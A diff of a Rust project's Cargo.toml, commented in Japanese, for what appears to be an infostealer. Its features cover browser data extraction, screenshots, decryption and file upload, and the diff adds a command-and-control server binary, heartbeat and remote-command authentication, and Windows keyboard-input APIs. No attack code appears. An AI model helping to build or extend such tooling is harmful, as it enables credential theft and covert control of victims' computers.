@@ -49,6 +49,10 @@ path = "src/main.rs"
 name = "decrypt"
 path = "src/bin/decrypt.rs"
 
+[[bin]]
+name = "c2_server"
+path = "src/bin/c2_server.rs"
+
 # ---------------------------
 # 依存関係（安定運用向け設定）
 # ---------------------------
@@ -71,45 +75,50 @@ base64 = { version = "0.22", default-features = false, features = ["std"] }
 # AEAD（最小機能のみ）
 aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
 
-# 並列処理（必要時のみ）
-# rayon = "1.11"  # 標準ライブラリのIteratorで置換
-
 # システム情報（最小化）
-whoami = { version = "1.5", default-features = false }
-local_ipaddress = { version = "0.1", default-features = false }
-
 # 段階的バイナリサイズ削減（バランス重視）
 anyhow = { version = "1.0", default-features = false }  # エラー処理（最小化）
 libloading = { version = "0.8", default-features = false }  # NSSで必要
 which = { version = "8.0.0", default-features = false, features = ["real-sys"] }  # NSSで必要
 thiserror = { version = "2.0.16", default-features = false }  # エラー処理マクロ
+dirs = { version = "5.0", default-features = false }  # ディレクトリ検索用
 
 # 条件付き依存関係（機能別）
 log = { version = "0.4", default-features = false, optional = true }  # ログ機能
-indicatif = { version = "0.17", default-features = false, features = ["unicode-width"], optional = true }  # プログレスバー
-chrono = { version = "0.4", default-features = false, features = ["clock", "std"], optional = true }  # 時刻処理
-
+indicatif = { version = "0.18.0", default-features = false, features = ["unicode-width"], optional = true }  # プログレスバー
+chrono = { version = "0.4", default-features = false, features = ["clock", "std"] }  # 時刻処理
+tokio = { version = "1.0", features = ["rt-multi-thread", "macros", "time", "sync", "signal", "net"] }  # async runtime（拡張版）  
+uuid = { version = "1.0", features = ["v4"] }  # UUID生成
+sysinfo = { version = "0.30", default-features = false }  # システム情報取得（ハートビート用）
+hmac = { version = "0.12", default-features = false }  # HMAC認証（リモートコマンド用）
+sha2 = { version = "0.10", default-features = false }  # SHA256ハッシュ（認証用）
+hex = { version = "0.4", default-features = false, features = ["alloc"] }   # 16進エンコーディング（署名用）
 # 必須依存関係（最小化）
 tempfile = { version = "3.8", default-features = false }
 walkdir = { version = "2.3", default-features = false }
 
+# --- For local Hyper test server (bin: c2_server) ---
+hyper = { version = "1", features = ["server", "http1"] }
+hyper-util = { version = "0.1", features = ["tokio"] }
+http-body-util = "0.1"
+bytes = "1"
+
 # ---- Feature設定（統一・最適化済み） ----
 [features]
 # デフォルト設定（最小構成）
-default = ["core"]
+default = ["full"]
 
-# 基本機能セット
-core = []
+core = []  # コア機能（常に有効）
 
 # 個別モジュール機能
-network = ["dep:minreq", "dep:chrono"]                    # ネットワーク通信（HTTP、ファイルアップロード）
+network = ["dep:minreq"]                                # ネットワーク通信（HTTP、ファイルアップロード）
 screenshot = ["dep:image", "dep:scrap"]                   # スクリーンショット機能
 browser = ["dep:rusqlite"]                                # ブラウザデータ取得機能
 
 # UI/UX機能
 progress-bar = ["dep:indicatif"]                          # プログレスバー表示
 logging = ["dep:log"]                                     # ログ機能
-datetime = ["dep:chrono"]                                 # 日時処理
+datetime = []                                            # 日時処理（常に有効）
 
 # サイズ最適化用機能フラグ
 ui-minimal = []                                           # UI要素を最小化（progress-bar除外）
@@ -120,13 +129,9 @@ size-optimized = ["ui-minimal", "crypto-minimal"]        # 総合サイズ最適
 database = ["browser"]
 
 # 機能グループ（段階的構成）
-basic = ["core", "browser", "datetime"]                     # 基本機能：コア + ブラウザ + 日時
+basic = ["core", "browser"]                               # 基本機能：コア + ブラウザ
 extended = ["basic", "screenshot", "progress-bar"]          # 拡張機能：基本 + スクリーンショット + UI
 full = ["extended", "network", "logging"]                   # 全機能：拡張 + ネットワーク + ログ
-
-# エイリアス（後方互換性）
-all-modules = ["full"]
-minimal = ["core"]
 
 # optional deps（必要時だけ読み込む）
 [dependencies.minreq]
@@ -155,7 +160,22 @@ optional = true
 [target.'cfg(windows)'.dependencies]
 windows = { version = "0.62.0", default-features = false, features = [
   "Win32_Foundation",
-  "Win32_Security",
-  "Win32_System_Threading"
+  "Win32_Security_Cryptography",
+  "Win32_System_Threading",
+  "Win32_System_Memory",
+  "Win32_System_Com",
+  "Win32_System_Ole",
+  "Win32_System_Rpc",
+  "Win32_System_Wmi",
+  "Win32_System_Variant",
+  "Win32_UI_Shell",
+  "Win32_UI_Input_KeyboardAndMouse",
+  "Win32_UI_WindowsAndMessaging",
+  "Win32_System_LibraryLoader",
+  "Win32_System_SystemInformation",
+  "Win32_Storage_FileSystem",
+  "Win32_System_Time",
+  "Win32_NetworkManagement_IpHelper",
+  "Win32_NetworkManagement_Ndis",
+  "Win32_Networking_WinSock",
 ] }
-winapi = { version = "0.3", features = ["wincrypt", "winbase", "dpapi"] }
